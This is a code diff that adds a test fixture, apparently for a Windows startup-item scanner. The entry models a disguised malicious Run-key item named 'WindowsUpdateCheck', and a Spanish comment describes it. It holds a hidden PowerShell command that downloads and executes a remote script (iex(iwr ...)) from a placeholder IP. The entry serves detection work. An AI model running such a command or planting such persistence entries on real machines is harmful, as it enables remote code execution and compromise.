@@ -210,6 +210,20 @@ def entries() -> list[Entry]:
             path=r"C:\Users\Ana\AppData\Local\Temp\7zXP1a\svc.exe",
             signature="sin firma",
         ),
+        # Lo de siempre de un virus que se disfraza: el programa es PowerShell, de Windows y
+        # firmado por Microsoft, pero arranca oculto y se baja algo de internet cada vez.
+        _e(
+            id="win:run:HKCU:Run:WindowsUpdateCheck",
+            name="WindowsUpdateCheck",
+            where="Registro: Run (tu usuario)",
+            command=r"powershell.exe -w hidden -ep bypass -c iex(iwr http://198.51.100.7/u.ps1 -UseBasicParsing)",
+            inline="iex(iwr http://198.51.100.7/u.ps1 -UseBasicParsing)",
+            exists=True,
+            path=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+            signature="válida",
+            signer="Microsoft Windows",
+            company="Microsoft Corporation",
+        ),
         _e(
             id="win:run:HKCU:Run:HappyThing",
             name="HappyThing",
